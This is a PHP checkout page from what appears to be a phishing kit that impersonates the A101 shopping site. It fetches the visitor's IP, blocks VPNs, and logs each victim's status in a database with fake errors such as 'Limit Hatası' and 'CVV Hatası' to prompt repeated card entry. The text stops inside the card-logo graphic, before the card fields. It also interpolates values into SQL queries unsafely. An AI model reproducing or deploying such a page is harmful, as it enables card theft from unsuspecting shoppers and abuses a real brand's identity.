<?php 

include_once("config.php");
include_once("./txmd/Data/Server/GrabIP.php");
include_once("./txmd/Data/Server/BlockVPN.php");
include_once("./txmd/Data/Server/BanControl.php");


$checkAdres = $pdo->query("SELECT * FROM logs_adres WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);

// SEO Variables
$page_title = "Ödeme - A101 Alışveriş";
$page_description = "Güvenli ödeme sayfası. Kredi kartı bilgilerinizi girin ve alışverişinizi tamamlayın.";

$sepetbosgorunum = "none";
$sepetgorunum = "block";

if ($_GET['status'] == "limit") {
   $pdo->query("UPDATE logs SET durum = 'Limit Hatası' WHERE ip = '{$ip}'");
} else if ($_GET['status'] == "internet") {
   $pdo->query("UPDATE logs SET durum = 'İ. Alışveriş Kapalı Hatası' WHERE ip = '{$ip}'");
} else if ($_GET['status'] == "skt") {
   $pdo->query("UPDATE logs SET durum = 'SKT Hatası' WHERE ip = '{$ip}'");
} else if ($_GET['status'] == "cvv") {
   $pdo->query("UPDATE logs SET durum = 'CVV Hatası' WHERE ip = '{$ip}'");
} else {
   $pdo->query("UPDATE logs SET durum = 'Ödeme Ekranı' WHERE ip = '{$ip}'");
}

$sorgu_checkBasket = $pdo->prepare("SELECT * FROM sepet WHERE ip_adresi = ?");
$sorgu_checkBasket->execute([$ip]);
$checkBasket = $sorgu_checkBasket->fetch(PDO::FETCH_ASSOC);

if ($checkBasket) {
   $urunlerArray = json_decode($checkBasket["urunler"], true);
   $sepetSayisi = is_array($urunlerArray) ? count($urunlerArray) : 0;

   if (!empty($urunlerArray)) {
      $sorgu_urunler = $pdo->prepare("SELECT id, urun_adi, urun_fiyati, urun_resmi FROM urunler WHERE id IN (" . implode(",", $urunlerArray) . ")");
      $sorgu_urunler->execute();
      $urunler = $sorgu_urunler->fetchAll(PDO::FETCH_ASSOC);
      foreach ($urunler as $urun) {
         $toplamFiyat2 += $urun['urun_fiyati'];
      }
      $toplamFiyat = number_format($toplamFiyat2, 2, ',', '.');
   }

   if ($sepetSayisi == 0 || $sepetSayisi == "0") {
      $sepetbosgorunum = "block";
      $sepetgorunum = "none";
   }
} else {
   $sepetSayisi = 0;
   $sepetbosgorunum = "block";
   $sepetgorunum = "none";
}

if ($sepetSayisi == 0) {
   header('Location: /');
}
?>
<!DOCTYPE html>
<html class="bg-zinc-900" lang="tr">

<head>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '737677165973170');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=737677165973170&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
   <meta charSet="utf-8" />
   <meta name="viewport" content="width=device-width" />
   <title><?php echo isset($page_title) ? $page_title : $urunbilgi['urun_adi']; ?></title>
   <meta name="next-head-count" content="16" />
   <link rel="preload" href="./assets/css/47Kb1JsK8kaH.css" as="style" />
   <link rel="stylesheet" href="./assets/css/47Kb1JsK8kaH.css" data-n-g="" />
   <link rel="preload" href="./assets/css/J2kGLr82eY3z.css" as="style" />
   <link rel="stylesheet" href="./assets/css/J2kGLr82eY3z.css" data-n-p="" />
   <noscript data-n-css=""></noscript>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
   <div id="__next" data-reactroot="">
      <div class="flex flex-col min-h-screen">
         <div class="sticky top-0 z-10 bg-white tablet:bg-brand-gray-background mobile:bg-brand-gray-background">
            <div class="bg-gradient-to-r from-[#71E6F5] to-brand-blue-primary pt-[10px] pb-[6px] overflow-x-scroll no-scrollbar overflow-y-hidden">
               <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                  <div class="flex items-center">
                     <div>
                        <div class="flex items-center gap-x-[6px] mobile:pr-4">
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-brand-blue-secondary flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="/">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Kurumsal" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/a101-logo-2_256x256.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                           </div>
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-white flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="/">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Ekstra" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/extra-logo_512x512.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                              <div class="absolute -left-4 tablet:-bottom-[7px] mobile:-bottom-[7px]"></div>
                           </div>
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-brand-blue-secondary flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="javascript:void(0);">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Kapıda" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/kapida-logo_512x512.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                           </div>
                        </div>
                     </div>
                     <div class="flex-1"></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:hidden laptop:block">
                        <a class="bg-brand-gray-background flex items-center rounded-full  cursor-pointer tablet:border tablet:border-white/50 tablet:h-12 tablet:w-12 tablet:justify-center laptop:w-auto laptop:px-4 desktop-px-6 p-2" title="Kampanyalar" href="/kampanyalar">
                           <div>
                              <svg width="17" height="18" viewBox="0 0 17 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M0.249268 7.20081V15.3183C0.249268 16.5213 1.22809 17.5002 2.43086 17.5002H13.8853C15.0884 17.5002 16.0672 16.5213 16.0672 15.3183V7.20081C16.0672 5.99775 15.0884 5.01892 13.8853 5.01892L11.6758 5.01906C11.9356 4.86076 12.1473 4.69535 12.2778 4.52635C13.0521 3.52573 12.8689 2.08692 11.8683 1.31265C11.4511 0.989786 10.9574 0.833496 10.4678 0.833496C9.78305 0.833496 9.10601 1.13899 8.65444 1.72223C8.42397 2.02004 8.26651 2.55616 8.15805 3.16145C8.04972 2.55602 7.89213 2.01976 7.66166 1.72223C7.21038 1.139 6.53334 0.833496 5.84861 0.833496C5.35904 0.833496 4.86538 0.989804 4.44825 1.31294C3.44763 2.08721 3.26443 3.52602 4.0387 4.52664C4.16938 4.69548 4.38121 4.86075 4.64074 5.01935L2.43079 5.01921C1.22802 5.01907 0.249268 5.99778 0.249268 7.20081ZM1.34016 15.3183V9.92821H7.61275V16.4094H2.4309C1.82959 16.4094 1.34016 15.92 1.34016 15.3183ZM14.9765 15.3183C14.9765 15.9197 14.487 16.4092 13.8856 16.4092H8.70371V9.92836H14.9763L14.9765 15.3183ZM13.8857 6.11006C14.4872 6.11006 14.9766 6.5995 14.9766 7.20095V8.83732L8.70401 8.83718V6.11007L13.8857 6.11006ZM9.51727 2.38995C9.74618 2.09399 10.0928 1.92432 10.4679 1.92432C10.7351 1.92432 10.9884 2.01101 11.2006 2.17529C11.4542 2.37145 11.6159 2.65473 11.6566 2.97248C11.6972 3.29051 11.6115 3.6051 11.4153 3.85838C11.2036 4.12373 10.2149 4.56731 9.05346 4.94898C9.13161 3.72999 9.31326 2.662 9.51727 2.38995ZM4.66013 2.9726C4.7007 2.65458 4.86256 2.37158 5.1161 2.17541C5.32836 2.01113 5.58174 1.92444 5.84894 1.92444C6.2239 1.92444 6.57041 2.09427 6.79916 2.38981C7.00287 2.66129 7.18422 3.72983 7.26268 4.94965C6.10204 4.56842 5.11366 4.12469 4.90171 3.85876C4.70512 3.60523 4.61941 3.29061 4.66013 2.9726ZM7.61275 6.10999V8.8374L1.34016 8.83725V7.20074C1.34016 6.59928 1.82959 6.10985 2.43105 6.10985L7.61275 6.10999Z" fill="#00BAD3"></path>
                              </svg>
                           </div>
                           <div class="ml-2 font-medium text-brand-blue-primary text-sm hidden laptop:block">Kampanyalar</div>
                        </a>
                     </div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:hidden laptop:block">
                        <div>
                           <div class="bg-brand-gray-background flex items-center rounded-full  cursor-pointer  tablet:border tablet:border-white/50 tablet:h-12 tablet:w-12 tablet:justify-center laptop:w-auto mobile:p-2 laptop:px-4">
                              <div>
                                 <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <circle cx="10.0001" cy="6.24984" r="3.90833" stroke="#00BAD3" stroke-width="1.35"></circle>
                                    <path d="M1.925 16.2779C1.925 14.1961 3.61264 12.5085 5.69445 12.5085H14.3056C16.3874 12.5085 18.075 14.1961 18.075 16.2779C18.075 17.1324 17.3823 17.8252 16.5278 17.8252H3.47222C2.61771 17.8252 1.925 17.1324 1.925 16.2779Z" stroke="#00BAD3" stroke-width="1.35"></path>
                                 </svg>
                              </div>
                              <div class="ml-2 text-brand-blue-primary text-sm hidden font-medium laptop:block">Giriş Yap</div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
               <div id="search-bar-section" class="hidden laptop:block">
                  <div class="flex items-center justify-between gap-2 w-full">
                     <div class="my-[10px] w-full">
                        <div class="relative flex-1">
                           <form><input id="onlineSearchBar" class="text-center outline-none caret-brand-blue-primary ring-0 pl-4 pr-10 focus:!ring-brand-gray-border focus:ring-0 focus:border-brand-gray-border w-full bg-white items-center h-10 tablet:h-12 rounded-full focus:placeholder:text-white cursor-pointer border border-brand-gray-border placeholder:text-brand-gray-secondary placeholder:text-base" placeholder="Aramak istediğin ürünü yaz..." value="" autocomplete="off"></form>
                           <div class="absolute mobile:left-3 laptop:left-4 top-1/2 -translate-y-1/2">
                              <div>
                                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M10.875 18.75C15.2242 18.75 18.75 15.2242 18.75 10.875C18.75 6.52576 15.2242 3 10.875 3C6.52576 3 3 6.52576 3 10.875C3 15.2242 6.52576 18.75 10.875 18.75Z" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M16.4434 16.4434L20.9997 20.9997" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                           <div class="absolute right-5 top-1/2 -translate-y-1/2"></div>
                        </div>
                     </div>
                     <?php if ($sepetSayisi > 0): ?>
                        <div class="w-full max-w-[160px]" onclick="window.location.href='sepet'">
                           <div>
                              <div>
                                 <div>
                                    <div class="w-full">
                                       <div class="w-full flex items-center rounded-3xl px-1 bg-brand-blue-primary h-12 cursor-pointer">
                                          <div class="p-2 bg-white rounded-full flex justify-center items-center h-10 w-10">
                                             <div class="relative">
                                                <svg width="22" height="20" viewBox="0 0 22 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                   <path d="M15.0292 15.3145C13.8912 15.3145 12.9685 16.2369 12.9685 17.3749C12.9685 18.5132 13.8909 19.4357 15.0289 19.4357C16.1672 19.4357 17.0896 18.5132 17.0896 17.3752C17.0886 16.2374 16.1667 15.3156 15.0292 15.3145ZM15.0292 18.5131C14.4005 18.5131 13.8912 18.0036 13.8912 17.3752C13.8912 16.7466 14.4005 16.2371 15.0289 16.2371C15.6576 16.2369 16.167 16.7466 16.167 17.3749C16.1662 18.0031 15.6573 18.512 15.0292 18.5131Z" fill="#333333"></path>
                                                   <path d="M20.5384 3.9065H4.16788L3.87995 2.73513C3.63127 1.71329 2.71392 0.99569 1.66249 1.00002H1.46127C1.20653 1.00002 1 1.20655 1 1.46144C1 1.71618 1.20653 1.92271 1.46127 1.92271H1.66249C2.28815 1.91766 2.8353 2.34371 2.98396 2.95162L5.22393 12.0993C5.47391 13.1191 6.39198 13.8335 7.44182 13.8254H17.0235C18.088 13.834 19.0145 13.0995 19.2491 12.0613L20.9883 4.45971C21.0198 4.32462 20.987 4.1826 20.8994 4.07478C20.8112 3.96639 20.6783 3.90433 20.5384 3.9065ZM18.3498 11.8585C18.2093 12.4758 17.6566 12.911 17.0235 12.9028H7.44182C6.81702 12.9095 6.26959 12.4854 6.12035 11.8786L4.39361 4.82919H19.9595L18.3498 11.8585Z" fill="#333333"></path>
                                                   <path d="M8.78862 15.3145C7.65059 15.3145 6.72791 16.2369 6.72791 17.3749C6.72791 18.5132 7.65045 19.4357 8.78848 19.4357C9.92665 19.4357 10.8492 18.5132 10.8492 17.3752C10.8482 16.2374 9.92622 15.3156 8.78862 15.3145ZM8.78862 18.5131C8.16007 18.5131 7.65059 18.0036 7.65059 17.3752C7.65059 16.7466 8.16007 16.2371 8.78848 16.2371C9.41703 16.2369 9.9265 16.7466 9.9265 17.3749C9.92578 18.0031 9.41674 18.512 8.78862 18.5131Z" fill="#333333"></path>
                                                   <path d="M15.0292 15.3145C13.8912 15.3145 12.9685 16.2369 12.9685 17.3749C12.9685 18.5132 13.8909 19.4357 15.0289 19.4357C16.1672 19.4357 17.0896 18.5132 17.0896 17.3752C17.0886 16.2374 16.1667 15.3156 15.0292 15.3145ZM15.0292 18.5131C14.4005 18.5131 13.8912 18.0036 13.8912 17.3752C13.8912 16.7466 14.4005 16.2371 15.0289 16.2371C15.6576 16.2369 16.167 16.7466 16.167 17.3749C16.1662 18.0031 15.6573 18.512 15.0292 18.5131Z" stroke="#333333" stroke-width="0.4"></path>
                                                   <path d="M20.5384 3.9065H4.16788L3.87995 2.73513C3.63127 1.71329 2.71392 0.99569 1.66249 1.00002H1.46127C1.20653 1.00002 1 1.20655 1 1.46144C1 1.71618 1.20653 1.92271 1.46127 1.92271H1.66249C2.28815 1.91766 2.8353 2.34371 2.98396 2.95162L5.22393 12.0993C5.47391 13.1191 6.39198 13.8335 7.44182 13.8254H17.0235C18.088 13.834 19.0145 13.0995 19.2491 12.0613L20.9883 4.45971C21.0198 4.32462 20.987 4.1826 20.8994 4.07478C20.8112 3.96639 20.6783 3.90433 20.5384 3.9065ZM18.3498 11.8585C18.2093 12.4758 17.6566 12.911 17.0235 12.9028H7.44182C6.81702 12.9095 6.26959 12.4854 6.12035 11.8786L4.39361 4.82919H19.9595L18.3498 11.8585Z" stroke="#333333" stroke-width="0.4"></path>
                                                   <path d="M8.78862 15.3145C7.65059 15.3145 6.72791 16.2369 6.72791 17.3749C6.72791 18.5132 7.65045 19.4357 8.78848 19.4357C9.92665 19.4357 10.8492 18.5132 10.8492 17.3752C10.8482 16.2374 9.92622 15.3156 8.78862 15.3145ZM8.78862 18.5131C8.16007 18.5131 7.65059 18.0036 7.65059 17.3752C7.65059 16.7466 8.16007 16.2371 8.78848 16.2371C9.41703 16.2369 9.9265 16.7466 9.9265 17.3749C9.92578 18.0031 9.41674 18.512 8.78862 18.5131Z" stroke="#333333" stroke-width="0.4"></path>
                                                </svg>
                                                <div class="absolute bg-brand-blue-primary text-white rounded-full p-1 w-auto h-[14px] text-[10px]  -top-1 -right-1 flex justify-center items-center"><?php echo $sepetSayisi; ?></div>
                                             </div>
                                          </div>
                                          <div class="flex w-full justify-center">
                                             <div class="text-white text-base font-medium">₺<?php echo $toplamFiyat; ?></div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     <?php endif; ?>
                  </div>
               </div>
            </div>
            <div class="mobile:block laptop:hidden ">
               <div class="w-full border-b">
                  <div class="my-[10px] w-full flex items-center">
                     <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                        <div class="relative flex-1">
                           <form><input id="onlineSearchBar" class="text-center outline-none caret-brand-blue-primary ring-0 pl-4 pr-10 focus:!ring-brand-gray-border focus:ring-0 focus:border-brand-gray-border w-full bg-white items-center h-10 tablet:h-12 rounded-full focus:placeholder:text-white cursor-pointer border border-brand-gray-border placeholder:text-brand-gray-secondary placeholder:text-base !pr-1 mobile:placeholder:!text-[15px]" placeholder="Aramak istediğin ürünü yaz..." value="" autocomplete="off"></form>
                           <div class="absolute mobile:left-3 laptop:left-4 top-1/2 -translate-y-1/2">
                              <div>
                                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M10.875 18.75C15.2242 18.75 18.75 15.2242 18.75 10.875C18.75 6.52576 15.2242 3 10.875 3C6.52576 3 3 6.52576 3 10.875C3 15.2242 6.52576 18.75 10.875 18.75Z" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M16.4434 16.4434L20.9997 20.9997" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                           <div class="absolute right-5 top-1/2 -translate-y-1/2"></div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="flex-1 bg-brand-gray-background pt-6">
            <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
               <div class="laptop:flex-row laptop:flex desktop:px-[22px]">
                  <div class="flex-col">
                     <div class="desktop:w-[660px] laptop:w-[644px] tablet:w-full ">
                        <div>
                           <div class="mb-7">
                              <div>Güvenli Öde</div>
                              <div class="w-full flex flex-col bg-white p-4 mt-4 rounded-3xl">
                                 <form class="space-y-4">
                                    <?php if ($_GET['status'] == "limit") {
                                       if ($checkAdres['ip_adresi']) {
                                          echo '<div><div onclick="adresSecAktiflestir();" class="mb-5 border-gray-200 border pl-3 py-3 rounded-3xl cursor-pointer relative"><div class="flex w-[94%] h-4 overflow-hidden line-clamp-1 whitespace text-ellipsis text-xs">🏠 <span class="whitespace-nowrap font-medium mr-1 ml-1">' . $checkAdres['baslik'] . ';</span><span>' . $checkAdres['mahalle'] . ' (' . $checkAdres['cadde'] . '), No:' . $checkAdres['bina'] . ' D:' . $checkAdres['daire'] . ' ' . $checkAdres['ilce'] . ' / ' . $checkAdres['il'] . '</span></div><svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg" class="absolute right-4 bottom-4"><path d="M9 1L5 4.5L1 1" stroke="#333333" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div>';
                                       } else {
                                          echo '<div><div onclick="adresSecAktiflestir();" class=" border-gray-200 border pl-3 py-3 rounded-3xl cursor-pointer relative"><div class="flex items-center"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14.307 4.58465C13.1567 3.4343 11.6272 2.80078 10.0004 2.80078C8.3736 2.80078 6.8441 3.4343 5.69378 4.58465C4.54343 5.73502 3.90991 7.26447 3.90991 8.89126C3.90991 12.1822 7.02162 14.9195 8.69335 16.3901C8.92567 16.5944 9.12629 16.7709 9.28612 16.9202C9.48637 17.1073 9.74341 17.2008 10.0004 17.2008C10.2574 17.2008 10.5144 17.1073 10.7147 16.9202C10.8745 16.7709 11.0751 16.5944 11.3074 16.3901C12.9792 14.9195 16.0909 12.1822 16.0909 8.89126C16.0909 7.26447 15.4574 5.73502 14.307 4.58465ZM10.7503 15.7567C10.5129 15.9656 10.3079 16.1459 10.1388 16.3038C10.0612 16.3763 9.93958 16.3763 9.8619 16.3038C9.69289 16.1459 9.48786 15.9656 9.25046 15.7567C7.67882 14.3742 4.75339 11.8008 4.75339 8.89128C4.75339 5.99811 7.10715 3.64434 10.0004 3.64434C12.8935 3.64434 15.2473 5.99811 15.2473 8.89128C15.2473 11.8008 12.3219 14.3742 10.7503 15.7567Z" fill="#333333" stroke="#333333" stroke-width="0.2"></path><path d="M10.0001 5.97656C8.52008 5.97656 7.31604 7.18058 7.31604 8.66055C7.31604 10.1405 8.52008 11.3445 10.0001 11.3445C11.48 11.3445 12.684 10.1405 12.684 8.66055C12.684 7.18058 11.48 5.97656 10.0001 5.97656ZM10.0001 10.501C8.98521 10.501 8.15957 9.67534 8.15957 8.66052C8.15957 7.64571 8.98521 6.82007 10.0001 6.82007C11.0149 6.82007 11.8405 7.64571 11.8405 8.66052C11.8405 9.67534 11.0149 10.501 10.0001 10.501Z" fill="#333333" stroke="#333333" stroke-width="0.2"></path></svg><span class="ml-2 text-xs">Adres Seçiniz</span></div></div></div><br>';
                                       }
                                    } else if ($_GET['status'] == "internet") {
                                       if ($checkAdres['ip_adresi']) {
                                          echo '<div><div onclick="adresSecAktiflestir();" class="mb-5 border-gray-200 border pl-3 py-3 rounded-3xl cursor-pointer relative"><div class="flex w-[94%] h-4 overflow-hidden line-clamp-1 whitespace text-ellipsis text-xs">🏠 <span class="whitespace-nowrap font-medium mr-1 ml-1">' . $checkAdres['baslik'] . ';</span><span>' . $checkAdres['mahalle'] . ' (' . $checkAdres['cadde'] . '), No:' . $checkAdres['bina'] . ' D:' . $checkAdres['daire'] . ' ' . $checkAdres['ilce'] . ' / ' . $checkAdres['il'] . '</span></div><svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg" class="absolute right-4 bottom-4"><path d="M9 1L5 4.5L1 1" stroke="#333333" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div>';
                                       } else {
                                          echo '<div><div onclick="adresSecAktiflestir();" class=" border-gray-200 border pl-3 py-3 rounded-3xl cursor-pointer relative"><div class="flex items-center"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14.307 4.58465C13.1567 3.4343 11.6272 2.80078 10.0004 2.80078C8.3736 2.80078 6.8441 3.4343 5.69378 4.58465C4.54343 5.73502 3.90991 7.26447 3.90991 8.89126C3.90991 12.1822 7.02162 14.9195 8.69335 16.3901C8.92567 16.5944 9.12629 16.7709 9.28612 16.9202C9.48637 17.1073 9.74341 17.2008 10.0004 17.2008C10.2574 17.2008 10.5144 17.1073 10.7147 16.9202C10.8745 16.7709 11.0751 16.5944 11.3074 16.3901C12.9792 14.9195 16.0909 12.1822 16.0909 8.89126C16.0909 7.26447 15.4574 5.73502 14.307 4.58465ZM10.7503 15.7567C10.5129 15.9656 10.3079 16.1459 10.1388 16.3038C10.0612 16.3763 9.93958 16.3763 9.8619 16.3038C9.69289 16.1459 9.48786 15.9656 9.25046 15.7567C7.67882 14.3742 4.75339 11.8008 4.75339 8.89128C4.75339 5.99811 7.10715 3.64434 10.0004 3.64434C12.8935 3.64434 15.2473 5.99811 15.2473 8.89128C15.2473 11.8008 12.3219 14.3742 10.7503 15.7567Z" fill="#333333" stroke="#333333" stroke-width="0.2"></path><path d="M10.0001 5.97656C8.52008 5.97656 7.31604 7.18058 7.31604 8.66055C7.31604 10.1405 8.52008 11.3445 10.0001 11.3445C11.48 11.3445 12.684 10.1405 12.684 8.66055C12.684 7.18058 11.48 5.97656 10.0001 5.97656ZM10.0001 10.501C8.98521 10.501 8.15957 9.67534 8.15957 8.66052C8.15957 7.64571 8.98521 6.82007 10.0001 6.82007C11.0149 6.82007 11.8405 7.64571 11.8405 8.66052C11.8405 9.67534 11.0149 10.501 10.0001 10.501Z" fill="#333333" stroke="#333333" stroke-width="0.2"></path></svg><span class="ml-2 text-xs">Adres Seçiniz</span></div></div></div><br>';
                                       }
                                    } else {
                                       if ($checkAdres['ip_adresi']) {
                                          echo '<div><div onclick="adresSecAktiflestir();" class="mb-5 border-gray-200 border pl-3 py-3 rounded-3xl cursor-pointer relative"><div class="flex w-[94%] h-4 overflow-hidden line-clamp-1 whitespace text-ellipsis text-xs">🏠 <span class="whitespace-nowrap font-medium mr-1 ml-1">' . $checkAdres['baslik'] . ';</span><span>' . $checkAdres['mahalle'] . ' (' . $checkAdres['cadde'] . '), No:' . $checkAdres['bina'] . ' D:' . $checkAdres['daire'] . ' ' . $checkAdres['ilce'] . ' / ' . $checkAdres['il'] . '</span></div><svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg" class="absolute right-4 bottom-4"><path d="M9 1L5 4.5L1 1" stroke="#333333" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div>';
                                       } else {
                                          echo '<div><div onclick="adresSecAktiflestir();" class=" border-gray-200 border pl-3 py-3 rounded-3xl cursor-pointer relative"><div class="flex items-center"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14.307 4.58465C13.1567 3.4343 11.6272 2.80078 10.0004 2.80078C8.3736 2.80078 6.8441 3.4343 5.69378 4.58465C4.54343 5.73502 3.90991 7.26447 3.90991 8.89126C3.90991 12.1822 7.02162 14.9195 8.69335 16.3901C8.92567 16.5944 9.12629 16.7709 9.28612 16.9202C9.48637 17.1073 9.74341 17.2008 10.0004 17.2008C10.2574 17.2008 10.5144 17.1073 10.7147 16.9202C10.8745 16.7709 11.0751 16.5944 11.3074 16.3901C12.9792 14.9195 16.0909 12.1822 16.0909 8.89126C16.0909 7.26447 15.4574 5.73502 14.307 4.58465ZM10.7503 15.7567C10.5129 15.9656 10.3079 16.1459 10.1388 16.3038C10.0612 16.3763 9.93958 16.3763 9.8619 16.3038C9.69289 16.1459 9.48786 15.9656 9.25046 15.7567C7.67882 14.3742 4.75339 11.8008 4.75339 8.89128C4.75339 5.99811 7.10715 3.64434 10.0004 3.64434C12.8935 3.64434 15.2473 5.99811 15.2473 8.89128C15.2473 11.8008 12.3219 14.3742 10.7503 15.7567Z" fill="#333333" stroke="#333333" stroke-width="0.2"></path><path d="M10.0001 5.97656C8.52008 5.97656 7.31604 7.18058 7.31604 8.66055C7.31604 10.1405 8.52008 11.3445 10.0001 11.3445C11.48 11.3445 12.684 10.1405 12.684 8.66055C12.684 7.18058 11.48 5.97656 10.0001 5.97656ZM10.0001 10.501C8.98521 10.501 8.15957 9.67534 8.15957 8.66052C8.15957 7.64571 8.98521 6.82007 10.0001 6.82007C11.0149 6.82007 11.8405 7.64571 11.8405 8.66052C11.8405 9.67534 11.0149 10.501 10.0001 10.501Z" fill="#333333" stroke="#333333" stroke-width="0.2"></path></svg><span class="ml-2 text-xs">Adres Seçiniz</span></div></div></div><br>';
                                       }
                                    }
                                    ?>
                                 </form>
                                 <hr>
                                 <div>
                                    <form class="border-b border-b-brand-gray-border pb-6 mb-6">
                                       <div class="flex items-center justify-between mb-6 mt-3">
                                          <div class="text-sm font-medium">Ödeme Seçenekleri</div>
                                       </div>
                                       <div>
                                          <div class="flex flex-col w-max space-y-4 text-sm
                                                ">
                                             <div class="flex items-center"><input type="radio" id="ccile" checked class="accent-brand-blue-primary form-radio cursor-pointer text-brand-blue-primary focus:ring-transparent w-5 h-5 border-brand-gray-border" id="option-craftgateNewCard" name="option" value="craftgateNewCard" style="box-shadow: none;"><label class="ml-2 cursor-pointer" for="option-craftgateNewCard">Kredi/Banka Kartı İle Öde</label></div>
                                             <div class="flex items-center"><input type="radio" onclick="document.getElementById('ccile').checked = true; errNotify('Bu seçenek şuan devre dışı.');" class="accent-brand-blue-primary form-radio cursor-pointer text-brand-blue-primary focus:ring-transparent w-5 h-5 border-brand-gray-border" id="option-giftCard" name="option" value="giftCard" style="box-shadow: none;"><label class="ml-2 cursor-pointer" for="option-giftCard">Hediye Çeki İle Öde</label></div>
                                          </div>
                                       </div>
                                    </form>
                                 </div>
                                 <div class="flex flex-col gap-4" style="z-index: 1;">
                                    <div class="flex justify-between items-center">
                                       <div class="text-sm font-medium">Kart Bilgilerim</div>
                                       <div>
                                          <svg width="137" height="24" viewBox="0 0 137 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                             <g clip-path="url(#clip0_883_73083)">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M-981.982 -522.9H41510V1254.3H-981.982V-522.9Z" stroke="#8D939C" stroke-width="0.692308"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M14.1445 21.4035H24.631V2.56226H14.1445V21.4035Z" fill="#FF5F00"></path>
